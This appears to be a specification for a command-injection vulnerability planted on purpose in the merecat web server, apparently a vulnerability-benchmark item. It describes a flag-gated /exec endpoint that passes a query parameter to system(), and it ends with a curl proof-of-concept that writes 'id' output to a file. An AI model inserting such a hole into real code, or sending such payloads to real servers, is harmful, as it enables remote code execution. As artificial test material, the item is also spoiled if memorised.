DESCRIPTION:
  CLI-flag-gated command injection. The server must be started with --exec-mode
  for the vulnerable endpoint to be reachable. A user-supplied URL query
  parameter flows through an exec_args_t dispatch struct before reaching
  system(). The S3 sanitization is bypassed by omitting --strict-exec.

CONFIG_GATE (C1 — simple):
  mechanism:  CLI flag (--exec-mode), stored in global int exec_mode
  check:      single boolean guard at the top of httpd_start_request()
              `if (exec_mode && strncmp(hc->encodedurl, "/exec", 5) == 0 ...)`
  complexity: one condition, one flag, no struct, no file parsing

INPUT_FLOW (I3 — struct dispatch):
  entry:      HTTP GET /exec?cmd=<payload>  →  hc->query (set during parsing)
  path:       httpd_start_request() dispatches to handle_exec()
              handle_exec() populates exec_args_t { .cmd = hc->query+4, .strict = exec_strict }
              args.cmd flows through snprintf(shell_cmd, ..., "%s", args.cmd) then system()
  transforms: struct field assignment, snprintf copy into stack buffer

SANITIZATION (S3 — config-gated, bypassed by omission):
  gate:       --strict-exec flag stored in args.strict via exec_strict global
  check:      `if (args.strict) { strpbrk(args.cmd, "|;&`$(){}") != NULL ... }`
  bypass:     omit --strict-exec on server startup so args.strict == 0

SINK:        system() in handle_exec() (src/libhttpd.c, injected before httpd_start_request)

CHANGED FILES:
  src/merecat.c — 3 hunks:
    1. globals:         added exec_mode, exec_strict
    2. usage():         added --exec-mode, --strict-exec entries in usage printf block
    3. main():          pre-scan loop compacts both exec flags out of argv before getopt

  src/libhttpd.c — 2 hunks:
    1. extern decls:    added extern int exec_mode, exec_strict
    2. exec_args_t:     new dispatch struct typedef
    3. handle_exec():   new function; I3/S3 implementation
    4. httpd_start_request(): exec route guard at the top of the function

EXPLOIT:
  build:   bash build.sh
  start:   ./merecat -n -p 18057 /tmp/www --exec-mode
  trigger: curl 'http://127.0.0.1:18057/exec?cmd=id>/tmp/pwned'
  verify:  cat /tmp/pwned
  expect:  uid=... line written by the server process

  gate bypass: omitting --exec-mode causes /exec to return 404.
  S3 bypass:   omit --strict-exec so args.strict == 0 and the strpbrk
               check is never reached.

NOTES:
  - system() output goes to server stdout/stderr, not the HTTP response body.
    Use write-to-file payloads (id>/tmp/pwned) to confirm blind execution.
  - The server runs in foreground mode (-n) to avoid daemonization for PoC use.
